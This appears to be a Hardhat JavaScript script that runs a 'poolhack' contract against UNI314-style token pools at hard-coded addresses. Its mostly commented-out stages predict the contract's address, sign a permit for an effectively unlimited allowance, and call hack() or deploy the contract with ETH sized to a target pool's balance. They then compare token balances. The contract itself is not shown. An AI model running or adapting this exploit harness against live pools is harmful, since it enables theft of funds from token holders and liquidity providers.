// npx hardhat run scripts/poolhack/poolhack.js --network dev
// npx hardhat run scripts/poolhack/poolhack.js --network hardhat
// npx hardhat run scripts/poolhack/poolhack.js --network zhaomei
// npx hardhat run scripts/poolhack/poolhack.js --network mzhaomei
const hre = require("hardhat");
const { writer_info, writer_info_all, writer_info_all_proxy } = require('../tool/hh_log.js');
const { getcontractinfo } = require('../tool/id-readcontracts.js');
const { WITHDRAW_loc_getsign } = require("../tool/sign/loc_getsign.js");
const { erc20_loc_getsign, zero_getsign } = require("../tool/sign/loc_getsign");
var contractinfo = new Object();
async function main() {
    var [owner, addr1, addr2, addr3] = await ethers.getSigners();
    console.log(
        "0x1b61b764d8ae1c3A9ebB3E590F21042367174AA4 balance:",
        await ethers.provider.getBalance("0x1b61b764d8ae1c3A9ebB3E590F21042367174AA4")
    );
    // {//部署poolhack
    //     var poolhack = await ethers.deployContract("poolhack");
    //     await poolhack.waitForDeployment();
    //     await writer_info_all(
    //         network,
    //         await artifacts.readArtifact("poolhack"),
    //         poolhack, []
    //     );
    // }

    // {//GET SIGN
    //     var path = "m/44'/60'/0'/0/0";
    //     var mnemonic = config.networks.hardhat.accounts.mnemonic;
    //     var Mnemonic = ethers.HDNodeWallet.fromPhrase(mnemonic).mnemonic;
    //     const account = await ethers.HDNodeWallet.fromMnemonic(Mnemonic, path);

    //     contractinfo = await getcontractinfo();
    //     // console.log(contractinfo[network.config.chainId]);
    //     var devinfo ={
    //         poolhack:{
    //             contractName: "poolhack",
    //             abi: (await artifacts.readArtifact("poolhack")).abi,
    //             address: poolhack.target,
    //             target: poolhack.target,
    //             network:{
    //                 url: network.config.url,
    //                 chainId: network.config.chainId
    //             }
    //         }
    //     }
    //     // = contractinfo[network.config.chainId];
    //     // console.log(devinfo.poolhack);
    //     var poolhack_permit = await erc20_loc_getsign(
    //         devinfo.poolhack,
    //         [account.address, addr1.address, 10n ** 50n, 9999999999],
    //         account.privateKey
    //     )
    //     let signer =await poolhack.t_permit(
    //         poolhack_permit
    //     )
    //     console.log({
    //         caller:owner.address,
    //         signer
    //     });
    //     return
    // }

    // {
    //     let ethamount=await poolhack.getethamount(
    //         "0xb17e563e35c2427496e3cd1e1b6d0636e6a869c6",
    //         poolhack_permit
    //     );
    //     console.log(ethamount);
    //     await poolhack.hack(
    //         ["0xb17e563e35c2427496e3cd1e1b6d0636e6a869c6"],
    //         poolhack_permit,{
    //             value: ethamount
    //         }
    //     );
    // }

    // {//test
    //     // {
    //     //     var UNI314 = new ethers.Contract(
    //     //         "0xB17e563e35c2427496e3cd1E1B6D0636E6A869c6",
    //     //         (await artifacts.readArtifact("UNI314")).abi,
    //     //         owner
    //     //     );
    //     //     console.log(
    //     //         "befor balance:", await UNI314.balanceOf(owner)
    //     //     );
    //     //     await owner.sendTransaction({
    //     //         to: "0xb17e563e35c2427496e3cd1e1b6d0636e6a869c6",
    //     //         value: ethers.parseEther("0.002"), // 1 ether
    //     //     });
    //     //     console.log(
    //     //         "after balance:", await UNI314.balanceOf(owner)
    //     //     );
    //     // }
    //     {
    //         var UNI314 = new ethers.Contract(
    //             // "0xB17e563e35c2427496e3cd1E1B6D0636E6A869c6",
    //             "0x644F48d6670969391f6e84a8D03a7F984219E7A5",
    //             (await artifacts.readArtifact("UNI314")).abi,
    //             owner
    //         );
    //         console.log(
    //             "befor balance:", await UNI314.balanceOf(owner)
    //         );
    //         await owner.sendTransaction({
    //             // to: "0xB17e563e35c2427496e3cd1E1B6D0636E6A869c6",
    //             to: "0x644F48d6670969391f6e84a8D03a7F984219E7A5",
    //             value: ethers.parseEther("0.02"), // 1 ether
    //         });
    //         console.log(
    //             "after balance:", await UNI314.balanceOf(owner)
    //         );
    //     }
    // }

    // {
    //     var deployerNonce = await ethers.provider.getTransactionCount(owner.address);
    //     var predictedAddress = await predictContractAddress(owner.address, (deployerNonce + 0));
    //     console.log("predictedAddress",predictedAddress);
    //     {//GET SIGN
    //         var path = "m/44'/60'/0'/0/0";
    //         var mnemonic = config.networks.hardhat.accounts.mnemonic;
    //         var Mnemonic = ethers.HDNodeWallet.fromPhrase(mnemonic).mnemonic;
    //         const account = await ethers.HDNodeWallet.fromMnemonic(Mnemonic, path);

    //         contractinfo = await getcontractinfo();
    //         // console.log(contractinfo[network.config.chainId]);
    //         var devinfo = {
    //             poolhack: {
    //                 contractName: "poolhack",
    //                 abi: (await artifacts.readArtifact("poolhack")).abi,
    //                 address: predictedAddress,
    //                 target: predictedAddress,
    //                 network: {
    //                     url: network.config.url,
    //                     chainId: network.config.chainId
    //                 }
    //             }
    //         }
    //         // = contractinfo[network.config.chainId];
    //         // console.log(devinfo.poolhack);
    //         var poolhack_permit = await zero_getsign(
    //             devinfo.poolhack,
    //             [account.address, addr1.address, 10n ** 50n, 9999999999],
    //             account.privateKey
    //         )
    //         return
    //         {//部署poolhack

    //             let ethamount = await ethers.provider.getBalance("0x644F48d6670969391f6e84a8D03a7F984219E7A5");
    //             console.log(
    //                 "0x644F48d6670969391f6e84a8D03a7F984219E7A5 balance:",
    //                 ethamount
    //             );
    //             console.log(poolhack_permit);
    //             // return
    //             var poolhack = await ethers.deployContract("poolhack",
    //                 [["0x644F48d6670969391f6e84a8D03a7F984219E7A5"],
    //                 poolhack_permit],{
    //                     value: ethamount
    //                 }
    //             );
    //             await poolhack.waitForDeployment();
    //             await writer_info_all(
    //                 network,
    //                 await artifacts.readArtifact("poolhack"),
    //                 poolhack, []
    //             );
    //             console.log("poolhack.address",poolhack.address);
    //         }
    //         let signer = await poolhack.t_permit(
    //             poolhack_permit
    //         )
    //         console.log({
    //             caller: owner.address,
    //             signer
    //         });
    //     }
    // }

    {//just sign
        let add = "0x7e821A0D0FfBEbd3520F436763e3797bF174E52B";
        var deployerNonce = await ethers.provider.getTransactionCount(add);
        var predictedAddress = await predictContractAddress(add, (deployerNonce + 0));
        var devinfo = {
            poolhack: {
                contractName: "poolhack",
                abi: (await artifacts.readArtifact("poolhack")).abi,
                address: predictedAddress,
                target: predictedAddress,
                network: {
                    url: network.config.url,
                    chainId: network.config.chainId
                }
            }
        }
        var poolhack_permit = await zero_getsign(
            devinfo.poolhack,
            [add, addr1.address, 10n ** 50n, 9999999999],
            "key"
        )
        console.log(poolhack_permit);
    }
}


main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});

function convertBigIntsToJSON(obj) {
    if (typeof obj === 'bigint') {
        return obj.toString();
    } else if (Array.isArray(obj)) {
        return obj.map(item => convertBigIntsToJSON(item));
    } else if (typeof obj === 'object' && obj !== null) {
        const newObj = {};
        for (const key in obj) {
            newObj[key] = convertBigIntsToJSON(obj[key]);
        }
        return newObj;
    } else {
        return obj;
    }
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}
function serializeBigInt(data) {
    return JSON.stringify(data, (_, value) =>
        typeof value === 'bigint'
            ? value.toString()
            : value
    );
}


async function decimal2big(token, value) {
    return BigInt(Math.floor(value * (10 ** Number(await token.decimals()))))
}
async function decimal2show(token, value) {
    return Math.floor(Number(value / (10n ** await token.decimals())))
}

async function predictContractAddress(deployerAddress, deployerNonce) {
    const rlp = require('rlp');
    const keccak = require('keccak');

    // RLP encode the sender address and nonce
    const encoded = rlp.encode([deployerAddress, deployerNonce]);

    // Hash the encoded data
    const hash = keccak('keccak256').update(encoded).digest('hex');

    // Take the last 20 bytes as the address
    const contractAddress = `0x${hash.slice(24)}`;
    return contractAddress;
}